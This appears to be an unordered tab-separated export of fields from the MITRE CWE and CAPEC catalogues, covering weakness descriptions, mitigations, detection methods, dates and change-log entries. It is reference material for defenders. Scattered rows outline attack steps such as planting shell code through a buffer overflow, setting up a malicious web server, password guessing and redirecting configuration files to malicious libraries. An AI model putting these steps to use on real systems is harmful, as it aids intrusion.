20249	23	The software prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved.
15482	28	CWE Content Team
10393	31	699
17767	39	2012-10-30
20016	53	The MITRE Corporation
19010	39	2008-07-01
6843	28	CWE Content Team
16169	28	CWE Content Team
10353	68	This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
10392	62	updated Potential_Mitigations, Time_of_Introduction
7626	35	MITRE
9170	94	Functions that assume information in the deserialized object is valid could be exploited.
24933	28	CWE Content Team
12803	31	699
14670	103	Primary
11002	39	2009-05-27
7152	76	2019-09-30
22141	35	MITRE
7606	35	MITRE
15011	35	MITRE
24324	42	If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.                   For example, stored procedures can enforce database query structure and reduce the likelihood of SQL injection.
8214	91	Architecture and Design
24129	91	Architecture and Design
20945	28	CWE Content Team
9687	43	Simple
19951	51	2017-01-12
12202	85	308
6684	28	CWE Content Team
15467	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.                   Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.
22307	103	Primary
8739	89	Standard
23532	35	MITRE
14287	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
15069	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
9253	102	ChildOf
19298	35	MITRE
13577	28	CWE Content Team
22375	39	2012-05-11
21252	28	CWE Content Team
8684	97	Cellular Rogue Base Station
17229	39	2017-01-19
15978	28	CWE Content Team
13976	90	C#
22189	76	2017-08-04
16548	28	CWE Content Team
23925	39	2011-03-29
16213	35	MITRE
22151	46	Passing an inadequately-sized output buffer to a path manipulation function can result in a buffer overflow. Such functions include realpath(), readlink(), PathAppend(), and others.
7767	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships
19606	62	updated Relationships, Taxonomy_Mappings
22001	59	Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required
20313	35	MITRE
12276	62	updated Observed_Examples
21028	35	MITRE
21458	39	2011-06-01
10716	39	2010-02-16
5627	48	03
7987	68	This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
6933	33	David Bacon et al
9829	21	CLASP
12637	85	168
12236	39	2008-07-01
10177	31	1000
11024	80	Although fuzzing parameters is not difficult, and often possible with automated fuzzers, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.
16560	103	Primary
13869	56	ChildOf
25415	76	2018-07-31
12865	35	Cigital
23771	62	updated Relationships
15615	90	Java
20194	63	Modify Memory
21825	81	Availability
18405	39	2008-10-14
19338	39	2018-03-27
22914	39	2009-03-10
14034	42	When programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory.
20525	49	2012
22553	78	Very High
21868	103	Primary
21473	22	09
16382	86	http://marc.info/?l=bugtraq&m=99263135911884&w=2
21913	42	Developers should anticipate that multiple internal special elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
21812	104	651
14726	35	MITRE
11627	35	MITRE
22235	80	Setup DNS server and the adversary's web server. Write a malicious script to allow the victim to connect to the web server.
9938	28	CWE Content Team
13024	79	Authorization
23151	28	CWE Content Team
22878	28	CWE Content Team
12365	72	Widely varied consequences are possible if an attacker is aware of an unexpected state in the software after a conditional. It may lead to information exposure, a system crash, or even complete attacker control of the system.
15721	39	2011-03-29
23455	45	Base
8436	91	Implementation
9655	103	Primary
13037	70	So Many Ways [...]: Exploiting Facebook and YoVille
17985	62	updated Relationships
22609	76	2015-11-09
22251	42	For any externally-influenced input, check the input against a white list of internal object attributes or fields that are allowed to be modified.
12009	62	updated Relationships
15849	62	updated Relationships
24298	28	CWE Content Team
13699	97	Cloning RFID Cards or Chips
15344	39	2012-10-30
21547	35	MITRE
16693	35	MITRE
21552	79	Availability
18941	62	updated Common_Consequences
18279	35	MITRE
25384	39	2017-05-03
15053	91	Architecture and Design
23112	35	MITRE
14974	86	https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/349.html
15797	79	Confidentiality
6767	103	Primary
25017	39	2009-10-29
10907	28	CWE Content Team
11203	91	Architecture and Design
6845	43	Simple
15506	59	Updated Description Summary, References, Related_Attack_Patterns
22382	48	07
11148	81	Access Control
6921	63	Unexpected State
24332	105	Mobile
8149	35	MITRE
15850	45	Class
11171	77	White Box
12195	80	This attack can be used to perform more sophisticated attacks (SQL injection, etc.)
22788	35	MITRE
18532	57	Primary
9379	81	Other
21132	85	548
9347	39	2018-03-27
17296	62	updated Affected_Resources, Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, References, Relationships, Taxonomy_Mappings
18587	57	Primary
13161	81	Confidentiality
17179	62	updated Potential_Mitigations
6699	44	SOAR Partial
9886	69	Incomplete
19832	92	Experiment
13848	31	1000
25084	42	Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.                   When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.                   Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).
13182	79	Confidentiality
7168	79	Availability
24430	39	2008-09-08
11988	81	Confidentiality
11382	62	updated Relationships
19923	89	Detailed
19583	99	Microsoft
9104	97	Physical Destruction of Device or Component
18027	44	High
20556	28	CWE Content Team
13694	62	updated Common_Consequences
16427	91	Implementation
15042	97	Accessing/Intercepting/Modifying HTTP Cookies
16876	28	CWE Content Team
12274	103	Primary
10543	86	http://msdn.microsoft.com/en-us/library/ff919712%28VS.85%29.aspx
21867	35	Cigital
24986	47	Read Data
10148	39	2008-10-14
5790	79	Confidentiality
21839	39	2008-09-08
7707	62	updated Demonstrative_Examples, References, Relationships
12392	90	Language-Independent
16238	35	MITRE
19286	28	CWE Content Team
19861	35	MITRE
11783	56	ChildOf
22150	89	Detailed
24873	80	The adversary needs to know basic linux commands.
17196	62	updated Relationships
8309	59	Updated Attack_Motivation-Consequences, Related_Vulnerabilities, Typical_Likelihood_of_Exploit, Typical_Severity
10253	63	DoS: Resource Consumption (CPU)
16007	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
6950	67	High
11872	56	CanPrecede
15758	39	2019-01-03
7902	31	1000
22695	50	Encrypt sensitive information when transmitted on insecure mediums to prevent interception.
10296	39	2008-07-01
14124	57	Primary
8862	39	2012-05-11
20659	91	Architecture and Design
19130	28	CWE Content Team
17835	28	CWE Content Team
13078	31	1000
15784	39	2010-02-16
11152	39	2019-06-20
22691	66	Blind XPath Injection
5910	28	CWE Content Team
10492	55	CAPEC Content Team
13719	62	updated Common_Consequences
9873	45	Variant
16161	28	Eric Dalci
14681	39	2008-09-24
18447	39	2019-01-03
12229	91	Architecture and Design
19709	31	1000
22260	66	Introduction to Code Signing
10871	81	Integrity
12761	39	2017-11-08
20780	73	Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.
7865	62	updated Alternate_Terms, Description, Name
19802	57	Indirect
9219	63	Other
9166	102	CanPrecede
5823	35	MITRE
14035	56	PeerOf
22772	88	SQL Injection: Hibernate
15516	28	CWE Content Team
9666	35	MITRE
11160	69	Draft
12121	59	Updated Related_Attack_Patterns
15764	21	PLOVER
9879	62	updated Common_Consequences
23818	78	Low
19155	95	Find a place where a buffer overflow occurs due to the fact that the new expanded size of the string is not correctly accounted for by the program. This may happen perhaps when the string is copied to another buffer that is big enough to hold the original, but not the expanded string. This may create an opportunity for planting the payload and redirecting program execution to the shell code.
13592	39	2011-03-29
24487	31	699
16982	79	Integrity
8065	76	2018-07-31
22344	33	Microsoft
8452	35	MITRE
7761	88	Transmission of Private Resources into a New Sphere ('Resource Leak')
20731	80	Executing remote scripts on host and collecting output
22094	43	Simple
24208	76	2017-08-04
9978	62	updated Name
19041	50	Utilize strict type, character, and encoding enforcement.
10816	62	updated Demonstrative_Examples, Description
24829	31	1000
9902	89	Detailed
11805	79	Authorization
18353	35	MITRE
21621	62	updated Relationships, Taxonomy_Mappings
22297	72	Format string problems can result in the execution of arbitrary code.
7941	51	2014-06-23
23360	79	Authorization
22852	62	updated Relationships, Taxonomy_Mappings
10945	72	Exposing critical functionality essentially provides an attacker with the privilege level of the exposed functionality. This could result in the modification or exposure of sensitive data or possibly even execution of arbitrary code.
22947	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
10842	39	2011-06-01
16363	62	updated Common_Consequences
8743	79	Authorization
11377	25	Low
14369	62	updated Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings
8819	104	489
20012	95	[Attempt variations on input parameters] Possibly using an automated tool, an attacker requests variations on the identified inputs. He sends parameters that include variations of payloads.
21361	85	15
23390	26	Implementation
16132	35	MITRE
6793	51	2014-06-23
17659	62	updated Applicable_Platforms, Common_Consequences, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction, Type
14437	62	updated Relationships
9596	39	2017-11-08
17823	39	2019-01-03
17059	91	Implementation
13851	92	Exploit
20781	100	The MITRE Corporation
7097	79	Access Control
22880	103	Primary
20246	39	2011-09-13
15650	21	CWE Content Team
19465	28	CWE Content Team
9867	39	2008-07-01
7795	35	MITRE
13910	35	MITRE
16465	28	CWE Content Team
6379	73	Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s).
17699	34	Memory leaks have two common and sometimes overlapping causes:                                                                  Error conditions and other exceptional circumstances                         Confusion over which part of the program is responsible for freeing the memory
15052	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
5883	62	updated Relationships, Taxonomy_Mappings
21562	48	09
7883	62	updated Relationships
23627	39	2019-01-03
12816	39	2009-07-27
24601	30	Jeremiah Grossman
12276	39	2017-11-08
6380	31	1000
22150	61	Draft
20415	62	updated Description
17612	62	updated Common_Consequences
10753	104	771
10981	63	Varies by Context
17447	63	Read Files or Directories
6599	72	CR and LF characters in an HTTP header may give attackers control of the remaining headers and body of the response the application intends to send, as well as allowing them to create additional responses entirely under their control.
22540	48	03
18769	35	MITRE
11987	45	Variant
23795	79	Confidentiality
13520	39	2011-06-27
21875	63	Other
24614	91	Implementation
21629	39	2012-05-11
9262	62	updated Related_Attack_Patterns, Relationships
16165	89	Detailed
16903	62	updated Relationships
21394	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
22869	91	Implementation
15788	62	updated Potential_Mitigations, Time_of_Introduction
9466	35	MITRE
24371	24	MITRE
16192	35	MITRE
17583	24	MITRE
17762	35	MITRE
18557	62	updated Relationships
13817	88	Improper Neutralization of Equivalent Special Elements
18499	81	Integrity
24865	100	The MITRE Corporation
11773	62	updated Description
5969	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
9936	52	To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files.
6191	28	CWE Content Team
14951	35	MITRE
9571	43	Simple
6705	102	ChildOf
7250	72	If a file or other resource is written in this method, as opposed to a valid way, logging of the activity may not occur.
17772	35	MITRE
19927	45	Class
10225	73	Look for cryptographic signatures
13246	28	CWE Content Team
14740	39	2017-11-08
20488	100	The MITRE Corporation
12273	39	2010-12-13
7496	39	2008-09-08
12514	95	Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code.
24670	39	2012-05-11
19018	97	XML Schema Poisoning
8509	35	MITRE
18069	28	CWE Content Team
13727	62	updated Demonstrative_Example
24776	28	CWE Content Team
22827	28	Eric Dalci
16683	71	2009
6688	53	The MITRE Corporation
11349	102	ChildOf
19558	76	2015-11-09
17650	62	updated Common_Consequences
11223	39	2010-04-05
20925	62	updated Common_Consequences
22309	35	MITRE
25172	62	updated References
21459	39	2009-03-10
8383	28	CWE Content Team
14412	26	Implementation
23204	28	CWE Content Team
8577	55	CAPEC Content Team
9017	39	2019-06-20
23252	57	Indirect
9019	103	Primary
8411	28	CWE Content Team
8171	101	CAPEC Content Team
24876	102	ChildOf
20832	62	updated Relationships
22754	42	Libraries that are loaded should be well understood and come from a trusted source. The application can execute code contained in the native libraries, which often contain calls that are susceptible to other security problems, such as buffer overflows or command injection. All native libraries should be validated to determine if the application requires the use of the library. It is very difficult to determine what these native libraries actually do, and the potential for malicious code is high. In addition, the potential for an inadvertent mistake in these native libraries is also high, as many are written in C or C++ and may be susceptible to buffer overflow or race condition problems. To help prevent buffer overflow attacks, validate all input to native calls for content and length. If the native library does not come from a trusted source, review the source code of the library. The library should be built from the reviewed source before using it.
7861	90	Language-Independent
23433	28	CWE Content Team
24019	28	CWE Content Team
21784	35	MITRE
20650	39	2010-12-13
18595	55	CAPEC Content Team
17169	39	2012-05-11
19577	39	2019-01-03
15626	50	Apply the latest patches to your user exposed services. This may not be a complete solution, especially against a zero day attack.
10701	104	1079
22361	63	DoS: Crash, Exit, or Restart
23489	99	SANS Software Security Institute
15857	39	2018-03-27
17804	39	2019-01-03
23690	35	MITRE
22935	49	2007
13524	28	CWE Content Team
11309	31	1000
19237	89	Standard
17694	74	3
7724	28	CWE Content Team
14047	35	MITRE
10071	31	699
24344	62	updated Applicable_Platforms
19688	35	MITRE
25335	62	updated Relationships, Taxonomy_Mappings
22495	43	Simple
17023	91	Operation
19708	62	updated Demonstrative_Examples, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
6513	46	This weakness can be generally described as mismatching memory management routines, such as:                                                The memory was allocated on the stack (automatically), but it was deallocated using the memory management routine free() (CWE-590), which is intended for explicitly allocated heap memory.                   The memory was allocated explicitly using one set of memory management functions, and deallocated using a different set. For example, memory might be allocated with malloc() in C++ instead of the new operator, and then deallocated with the delete operator.                                          When the memory management functions are mismatched, the consequences may be as severe as code execution, memory corruption, or program crash. Consequences and ease of exploit will vary depending on the implementation of the routines and the object being managed.
18278	63	Varies by Context
25060	91	Implementation
15303	62	updated References, Relationships, Taxonomy_Mappings
20424	28	CWE Content Team
8332	62	updated Relationships
22548	61	Draft
8283	63	Read Memory
10911	35	KDM Analytics
17730	35	MITRE
13820	103	Primary
13162	39	2015-12-07
7928	81	Integrity
8127	28	Sean Eidemiller
23054	28	CWE Content Team
8147	31	1000
20619	104	1007
7536	39	2008-11-24
10382	73	Modify the variable of the SWF file that contains the remote movie URL to the attacker controlled flash file.
7608	34	This typically occurs in situations when only one element is expected to be specified.
17335	76	2017-05-01
8732	31	1000
12160	97	XML Ping of the Death
23854	35	Cigital
16542	103	Primary
19407	28	CWE Content Team
15420	81	Access Control
21181	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.
12963	43	Simple
11048	62	updated Potential_Mitigations
24578	81	Access Control
25311	42	Use languages, libraries, or frameworks that make it easier to handle numbers without unexpected consequences.                   Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++).
20940	63	Read Files or Directories
17330	56	ChildOf
12202	97	UDP Scan
11664	81	Availability
6822	39	2017-11-08
14841	39	2009-07-17
21363	23	The software does not properly protect an assumed-immutable element from being modified by an attacker.
22250	35	MITRE
13591	103	Primary
14175	85	12
19934	91	Implementation
15884	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
8062	101	CAPEC Content Team
11954	62	updated Relationships, Taxonomy_Mappings
14159	62	updated Relationships
17301	35	MITRE
21037	88	Incorrect Calculation of Buffer Size
21078	59	Updated Resources_Required
6633	51	2015-11-09
6706	68	This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.
7906	39	2012-10-30
15373	35	MITRE
8881	101	CAPEC Content Team
13183	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Web Application Scanner
23298	39	2008-09-08
23354	44	High
10191	56	ChildOf
19862	59	Updated Related_Attack_Patterns
23767	100	The MITRE Corporation
5611	103	Primary
7414	28	CWE Content Team
19244	102	ChildOf
12853	63	Read Application Data
23139	28	CWE Content Team
10572	56	ChildOf
16939	35	MITRE
23132	62	updated Common_Consequences
22313	28	CWE Content Team
9824	63	Reduce Maintainability
20429	69	Draft
13476	28	CWE Content Team
12934	35	MITRE
13903	42	Temporary files and other supporting resources should be deleted/released immediately after they are no longer needed.
12667	62	updated Relationships
20082	28	CWE Content Team
10050	103	Primary
13985	62	updated Common_Consequences
9156	39	2010-06-21
14431	101	CAPEC Content Team
21265	62	updated Demonstrative_Examples, Modes_of_Introduction, References, Relationships
13653	50	This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.
8919	101	CAPEC Content Team
12340	26	Implementation
23393	54	High
19869	56	ChildOf
11922	91	Implementation
19474	39	2017-05-03
10946	85	554
18122	62	updated References, Related_Attack_Patterns, Relationships
7760	39	2013-02-21
6620	62	updated Relationships, Taxonomy_Mappings
24140	45	Base
7409	100	The MITRE Corporation
8805	32	The Wikimedia Foundation, Inc
21853	62	updated Common_Consequences
19287	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Related_Attack_Patterns, Relationships
23960	28	CWE Content Team
15479	35	MITRE
9676	100	The MITRE Corporation
8009	62	updated Related_Attack_Patterns
18694	103	Primary
15756	91	Operation
13846	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
18847	88	Predictable from Observable State
21212	39	2011-06-01
6010	39	2013-07-17
19323	31	1003
16326	45	Variant
9522	62	updated Related_Attack_Patterns, Relationships
7971	103	Primary
15064	35	MITRE
17745	39	2017-11-08
5807	23	An adversary adds a space character to the end of a file extension and takes advantage of an application that does not properly neutralize trailing special elements in file names. This extra space, which can be difficult for a user to notice, affects which default application is used to operate on the file and can be leveraged by the adversary to control execution.
8406	40	The target host uses session IDs to keep track of the users.
22195	43	Chain
16818	74	3
24024	35	MITRE
11339	35	MITRE
8053	103	Primary
22525	35	MITRE
16216	35	MITRE
15393	35	MITRE
17126	62	updated Potential_Mitigations
15286	28	CWE Content Team
19360	28	CWE Content Team
15104	90	Language-Independent
25047	35	MITRE
5903	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13978	76	2017-01-09
11883	35	MITRE
15246	28	CWE Content Team
10931	51	2014-06-23
24645	35	MITRE
16915	47	Bypass Protection Mechanism
8061	95	The second step that an attacker would undertake is to analyze the WSDL files and try to find potential weaknesses by sending messages matching the pattern described in the WSDL file. The attacker could run through all of the operations with different message request patterns until a breach is identified.
5763	42	When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.                   For example, US government systems require FIPS 140-2 certification.                   Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.                   Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]
24105	28	CWE Content Team
8837	91	Implementation
23046	62	updated Demonstrative_Examples, References, Relationships
8784	28	CWE Content Team
7908	46	The use of predictable seeds significantly reduces the number of possible seeds that an attacker would need to test in order to predict which random numnbers will be generated by the PRNG.
8753	80	The adversary must typically overcome network and host defenses in order to place malware on the system.
17388	46	This pattern identifies situations where a storable data element or member data element is initialized with a value in a block of code which is declared as static. This issue can make the software perform more slowly by performing initialization before it is needed.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
24045	62	updated Taxonomy_Mappings
21634	35	MITRE
17614	103	Primary
6897	35	MITRE
5783	28	CWE Content Team
18819	46	In various applications, a user is only expected to perform a certain action once, such as voting, requesting a refund, or making a purchase. When this restriction is not enforced, sometimes this can have security implications. For example, in a voting application, an attacker could attempt to "stuff the ballot box" by voting multiple times. If these votes are counted separately, then the attacker could directly affect who wins the vote. This could have significant business impact depending on the purpose of the software.
15380	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
13257	62	updated Potential_Mitigations, Time_of_Introduction
12794	39	2008-10-14
7637	94	Code Injection attack patterns can result in a wide variety of consequences and negatively affect all three elements of the security triad.
25117	62	updated Common_Consequences
20516	66	Transitioning to ARC Release Notes
24576	47	Execute Unauthorized Commands
23797	56	CanPrecede
6532	94	A successful Stored XSS attack can enable an adversary to exfiltrate sensitive information from the application.
16313	28	CWE Content Team
9918	35	MITRE
18071	35	MITRE
22875	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
14341	100	The MITRE Corporation
8638	100	The MITRE Corporation
24588	45	Variant
5821	92	Explore
11115	62	updated Relationships
13950	35	MITRE
12352	33	Michal Zalewski
10539	43	Simple
23269	28	CWE Content Team
10839	59	Updated Description Summary, References, Related_Attack_Patterns
9814	104	12
5726	35	MITRE
25007	96	2018-03-07
15384	101	CAPEC Content Team
18276	62	updated Relationships
19053	73	The attacker modifies the entries in the configuration files pointing to the malicious libraries he crafted.
6347	35	MITRE
10335	88	EJB Bad Practices: Use of Class Loader
11345	31	1000
19777	91	Implementation
12591	79	Confidentiality
13900	28	CWE Content Team
20452	62	updated Description, Relationships
12259	85	421
11230	78	Low
7913	62	updated Common_Consequences, Other_Notes, Potential_Mitigations
12930	101	CAPEC Content Team
10257	42	Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
19189	35	MITRE
18092	62	updated Demonstrative_Examples
17704	39	2008-09-08
7282	59	Updated Attack_Prerequisites, Description Summary, Resources_Required
7850	39	2019-01-03
16987	35	MITRE
11226	28	CWE Content Team
14666	35	MITRE
23078	69	Draft
14818	39	2011-06-01
21181	97	Using Escaped Slashes in Alternate Encoding
13194	39	2017-11-08
20836	35	MITRE
9148	35	MITRE
22472	69	Incomplete
19603	28	Sean Eidemiller
14585	35	MITRE
10652	26	Architecture and Design
18547	72	Many injection attacks involve the disclosure of important information -- in terms of both data sensitivity and usefulness in further exploitation.
11348	23	This type of attack leverages the use of symbolic links to cause buffer overflows. An attacker can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.
22090	28	CWE Content Team
16829	31	1000
23966	97	HTTP Parameter Pollution (HPP)
23182	39	2019-01-03
16914	28	CWE Content Team
20469	62	updated Common_Consequences, Observed_Examples
15898	104	430
22639	39	2012-05-11
24941	31	1000
17871	100	The MITRE Corporation
24654	35	MITRE
13837	62	updated Relationships, Taxonomy_Mappings
14506	88	Improper Neutralization of Wildcards or Matching Symbols
19781	28	CWE Content Team
7105	95	The attacker can send input data to the host target (e.g., via http request or command line request
14308	28	CWE Content Team
10545	31	1000
17441	62	updated Common_Consequences
22009	90	Ruby
9935	76	2017-05-01
7563	35	MITRE
19123	78	Very High
14064	56	CanAlsoBe
23043	39	2019-09-19
25038	56	ChildOf
5814	69	Draft
20897	88	Privilege Chaining
18875	35	MITRE
14948	35	MITRE
18731	81	Integrity
12657	70	Finding Vulnerabilities in Flash Applications
18963	62	updated References
16181	55	CAPEC Content Team
12079	62	updated Common_Consequences
17298	74	3
13384	91	Implementation
10987	103	Primary
19922	35	MITRE
9552	57	Primary
20101	28	CWE Content Team
24621	28	CWE Content Team
10108	62	updated Other_Notes, Relationship_Notes
20290	81	Confidentiality
23811	88	Improper Handling of Windows ::DATA Alternate Data Stream
17889	69	Draft
22031	94	Run Arbitrary Code
21690	47	Bypass Protection Mechanism
13697	28	CWE Content Team
19637	63	Read Application Data
23790	89	Standard
20680	101	CAPEC Content Team
12886	101	CAPEC Content Team
11439	39	2017-11-08
17239	35	MITRE
14678	63	Execute Unauthorized Code or Commands
23339	62	updated Relationships, Type
14608	77	Architecture or Design Review
11245	81	Other
6916	27	The adversary must be able to reverse engineer a client of the targeted service. However, the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality.
15054	35	MITRE
20439	28	CWE Content Team
7594	39	2009-10-29
16070	28	CWE Content Team
13634	39	2011-03-29
19467	62	updated Relationships, Taxonomy_Mappings
19797	66	Optimal Asymmetric Encryption Padding
24155	96	2018-07-02
10996	21	CLASP
20478	39	2010-04-05
8085	35	MITRE
14837	94	A successful Stored XSS attack can allow an adversary to tamper with application data.
12091	35	MITRE
6094	100	The MITRE Corporation
21012	23	The product uses automatically-generated code that cannot be      executed without a specific runtime support component.
23266	76	2017-08-04
22183	90	Language-Independent
14350	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, glibc in Linux provides protection against free of invalid pointers.
14954	35	MITRE
7220	39	2014-02-18
13096	46	This can be used by an attacker to bypass the validation and launch attacks that expose weaknesses that would otherwise be prevented, such as injection.
20774	63	Unexpected State
14990	45	Variant
6096	81	Other
20187	63	DoS: Resource Consumption (CPU)
13274	100	The MITRE Corporation
22368	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships
20049	46	Declaring a method to throw Exception or Throwable makes it difficult for callers to perform proper error handling and error recovery. Java's exception mechanism, for example, is set up to make it easy for callers to anticipate what can go wrong and write code to handle each specific exceptional circumstance. Declaring that a method throws a generic form of exception defeats this system.
9005	35	MITRE
17555	62	updated Common_Consequences
13344	39	2008-09-08
7172	28	CWE Content Team
15443	39	2008-07-01
6827	100	The MITRE Corporation
14454	104	540
22529	90	Java
17404	47	Execute Unauthorized Commands
19047	88	Path Equivalence: Windows 8.3 Filename
9456	28	CWE Content Team
20741	81	Other
6765	56	ChildOf
9491	62	updated Relationships
12250	28	CWE Content Team
18554	28	CWE Content Team
10334	87	Web Server
21856	53	The MITRE Corporation
7320	66	New developments in password hashing: ROM-port-hard functions
13299	39	2019-01-03
17104	52	Manual white-box analysis can be very effective for finding this issue, since there is typically a relatively small number of include or require statements in each program.
16155	62	updated Related_Attack_Patterns
16432	26	Implementation
20409	35	MITRE
9709	49	2007
23444	104	650
11055	78	Medium
18297	76	2018-07-31
6896	28	CWE Content Team
16153	46	Covert storage channels occur when out-of-band data is stored in messages for the purpose of memory reuse. Covert channels are frequently classified as either storage or timing channels. Examples would include using a file intended to hold only audit information to convey user passwords--using the name of a file or perhaps status bits associated with it that can be read by all users to signal the contents of the file. Steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel.
13805	35	Cigital
22991	100	The MITRE Corporation
14652	35	MITRE
19109	43	Simple
22324	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling                            Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
20312	62	updated Relationships
23339	35	MITRE
15893	28	CWE Content Team
20305	59	Updated References, Related_Weaknesses
13208	62	updated Relationships, Taxonomy_Mappings
24071	56	ChildOf
16576	28	CWE Content Team
8160	59	Updated Related_Weaknesses
5986	59	Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Resources_Required
12896	77	Manual Static Analysis - Source Code
9230	31	699
10760	45	Variant
15816	39	2008-07-01
18060	31	1000
5875	103	Primary
24105	39	2012-05-11
17304	39	2012-05-11
10184	51	2014-06-23
24120	39	2009-01-12
6771	69	Draft
12185	97	Target Influence via Eye Cues
24615	35	MITRE
12502	28	Eric Dalci
24383	62	updated Relationships
13104	62	updated Relationships, Taxonomy_Mappings
21823	42	Do not hardwire passwords into your software.
19560	32	IBM Rational Security Team
11414	63	Modify Application Data
18918	62	updated Relationships
24072	73	An attacker makes authorized connections and records the session tokens or credentials issued.
22218	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
7220	62	updated Potential_Mitigations, References
8051	89	Detailed
10660	79	Confidentiality
